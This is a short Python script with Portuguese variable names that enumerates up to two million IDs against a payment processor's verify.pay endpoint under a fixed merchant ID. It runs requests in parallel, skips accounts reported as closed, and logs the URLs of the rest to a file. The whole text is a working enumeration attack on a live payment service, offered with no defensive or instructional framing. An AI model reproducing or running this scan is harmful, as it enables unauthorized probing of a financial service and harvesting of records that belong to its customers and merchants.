

import requests
from joblib import Parallel, delayed

def multi_thread(tempo):
        proxies = {'https': ''}
        get =requests.get(f'https://paytrace.com/verify.pay?id={tempo}&mid=888000002887&img=5', proxies=proxies,verify=True)
        resposta = get.text
        if 'This account is closed.' in resposta:
            print(f'ID Conta Fechada {tempo}')
        
        else:
            if '<a href=></a>' in resposta:
                print ('Vazio {}'.format(tempo))
                with open("contas.txt", 'a') as arquivo:
                    arquivo.write(f'Id da URL é https://paytrace.com/verify.pay?id={tempo}&mid=888000002887&img=5 \n')

resultado = Parallel(n_jobs=2)(delayed(multi_thread)(tempo) for tempo in range(0,2000000))

